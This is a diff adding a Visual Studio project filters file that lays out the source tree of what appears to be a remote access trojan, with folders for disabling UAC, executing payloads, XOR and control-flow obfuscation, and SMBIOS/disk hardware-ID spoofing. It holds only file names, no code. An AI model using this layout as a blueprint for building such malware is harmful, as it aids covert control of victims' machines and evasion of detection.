@@ -1,0 +1,96 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <ItemGroup>
+    <Filter Include="Source">
+      <UniqueIdentifier>{632b97bc-cd18-49ef-a861-324d19f2f359}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Source\Rat">
+      <UniqueIdentifier>{022735ff-04b2-4178-8cea-eda7d5510f50}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Source\Rat\Main">
+      <UniqueIdentifier>{2512ec77-5267-457b-be98-3267e843f4f8}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Source\Rat\DisableUAC">
+      <UniqueIdentifier>{ccc7e4ce-0e24-4314-817f-235edb4582fc}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Source\Rat\Execute">
+      <UniqueIdentifier>{d50f4cd4-162d-4bf7-8f43-6d0255b89005}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Source\Rat\Includes">
+      <UniqueIdentifier>{9ac33240-dffe-429a-b6b9-53fba4a471d7}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Source\Rat\Xor">
+      <UniqueIdentifier>{2733d712-2e49-47a8-9aa8-513853163b2f}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Source\Spoofing">
+      <UniqueIdentifier>{d80e5648-0854-4aee-90ca-b262886bf33c}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Source\Spoofing\Disk">
+      <UniqueIdentifier>{5ad7b2a2-7350-484c-b484-8fc1f01454bc}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Source\Rat\CFF">
+      <UniqueIdentifier>{bd6af762-fe7d-45c5-a241-4e581e55bff9}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Source\Rat\Oxorany">
+      <UniqueIdentifier>{628e2b5d-4d84-4870-8750-3c5314fd30a7}</UniqueIdentifier>
+    </Filter>
+  </ItemGroup>
+  <ItemGroup>
+    <ClCompile Include="main.cpp">
+      <Filter>Source\Rat\Main</Filter>
+    </ClCompile>
+    <ClCompile Include="Spoof\disks.cpp">
+      <Filter>Source\Spoofing\Disk</Filter>
+    </ClCompile>
+    <ClCompile Include="Spoof\log.cpp">
+      <Filter>Source\Spoofing\Disk</Filter>
+    </ClCompile>
+    <ClCompile Include="Spoof\smbios.cpp">
+      <Filter>Source\Spoofing\Disk</Filter>
+    </ClCompile>
+    <ClCompile Include="Spoof\utils.cpp">
+      <Filter>Source\Spoofing\Disk</Filter>
+    </ClCompile>
+    <ClCompile Include="oxorany.cpp">
+      <Filter>Source\Rat\Oxorany</Filter>
+    </ClCompile>
+  </ItemGroup>
+  <ItemGroup>
+    <ClInclude Include="uac.h">
+      <Filter>Source\Rat\DisableUAC</Filter>
+    </ClInclude>
+    <ClInclude Include="execute.h">
+      <Filter>Source\Rat\Execute</Filter>
+    </ClInclude>
+    <ClInclude Include="xor.hpp">
+      <Filter>Source\Rat\Xor</Filter>
+    </ClInclude>
+    <ClInclude Include="includes.h">
+      <Filter>Source\Rat\Includes</Filter>
+    </ClInclude>
+    <ClInclude Include="Spoof\disks.h">
+      <Filter>Source\Spoofing\Disk</Filter>
+    </ClInclude>
+    <ClInclude Include="Spoof\log.h">
+      <Filter>Source\Spoofing\Disk</Filter>
+    </ClInclude>
+    <ClInclude Include="Spoof\shared.h">
+      <Filter>Source\Spoofing\Disk</Filter>
+    </ClInclude>
+    <ClInclude Include="Spoof\smbios.h">
+      <Filter>Source\Spoofing\Disk</Filter>
+    </ClInclude>
+    <ClInclude Include="Spoof\utils.h">
+      <Filter>Source\Spoofing\Disk</Filter>
+    </ClInclude>
+    <ClInclude Include="cff.h">
+      <Filter>Source\Rat\CFF</Filter>
+    </ClInclude>
+    <ClInclude Include="oxorany.h">
+      <Filter>Source\Rat\Oxorany</Filter>
+    </ClInclude>
+    <ClInclude Include="oxorany_include.h">
+      <Filter>Source\Rat\Oxorany</Filter>
+    </ClInclude>
+  </ItemGroup>
+</Project>
